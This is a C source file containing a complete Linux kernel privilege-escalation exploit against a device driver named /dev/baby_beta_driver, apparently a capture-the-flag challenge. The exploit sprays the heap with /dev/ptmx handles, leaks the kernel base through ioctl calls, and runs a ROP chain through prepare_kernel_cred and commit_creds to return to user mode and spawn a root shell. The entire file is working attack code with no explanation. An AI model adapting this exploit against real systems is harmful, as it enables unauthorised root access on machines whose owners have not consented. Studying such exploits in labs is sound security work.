#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <ctype.h>

typedef struct req{
	int size;
	char *data;
}req;

void shell() {
	puts("Elevating ...");
	system("sh");
}

uint64_t user_cs, user_ss, user_rflags, user_sp;
void save_user_status() {
   	__asm__ (
		"mov user_cs, cs;"
		"mov user_ss, ss;"
		"mov user_sp, rsp;"
		"pushf; pop  user_rflags;"
   	);
}

void main() {
	req a;

	save_user_status();

	int fd = open("/dev/baby_beta_driver", O_RDWR);
	if(fd < 0){
		printf("[-] Error opening chardev\n");
		exit(0);
	}

	// heap spray for leaking kernel base	
	int fds[50];
	for(int x = 0; x < 50; x++){
		fds[x] = open("/dev/ptmx",7);
	}
	for(int x = 0; x < 50; x++){
		close(fds[x]);
	}
	
	a.data = 0;
	a.size = 0x2e0;
 
	ioctl(fd, 0x1337c0de, &a);

	a.data = malloc(0x100);
	a.size = 0x30;

	ioctl(fd, 0xc0de1337, &a);

	unsigned long long kernel_base = *(unsigned long long*)(a.data + 3 * 8) - 0x623cc0;
	printf("[*] Kernel Base: 0x%llx\n", kernel_base);
	
	uint64_t prepare_kernel_cred = kernel_base + 0x053bb0;
	uint64_t commit_creds = kernel_base + 0x53d00;	
	uint64_t pop_rdx = kernel_base + 0x1401f6;
	uint64_t mov_rcx_rax = kernel_base + 0x130e45;
	uint64_t mov_rdi_rcx = kernel_base + 0x03843f;
	uint64_t pop_rdi  = kernel_base + 0x11a54d;
	// ref: https://github.com/torvalds/linux/blob/master/arch/x86/entry/entry_64.S#L587
	uint64_t ret2usr  = kernel_base + 0x200cc6;
	
	char payload[0xf0];

	for (int i=0; i < 64; i++) {
		payload[i]=0x41;
	}

	uint64_t rop[16*8];
	int i = -1;

	rop[++i] = pop_rdi;
	rop[++i] = 0x0;
	rop[++i] = prepare_kernel_cred;
	rop[++i] = pop_rdx;
	rop[++i] = 0;
	rop[++i] = mov_rcx_rax;
	rop[++i] = mov_rdi_rcx;
	rop[++i] = commit_creds;
	rop[++i] = ret2usr;
	rop[++i] = 0x0;
	rop[++i] = 0x0;
	rop[++i] = shell;
	rop[++i] = user_cs;
	rop[++i] = user_rflags;
	rop[++i] = user_sp;
	rop[++i] = user_ss;

	memcpy((unsigned char *)(payload + 64), rop, sizeof(rop));

	a.data = malloc(0xf0);
	a.size = 0xf0;

	memcpy(a.data, payload, a.size);

	ioctl(fd, 0x1337c0de, &a);
	a.size = 0xf0;

	ioctl(fd, 0xc0de1337, &a);

}

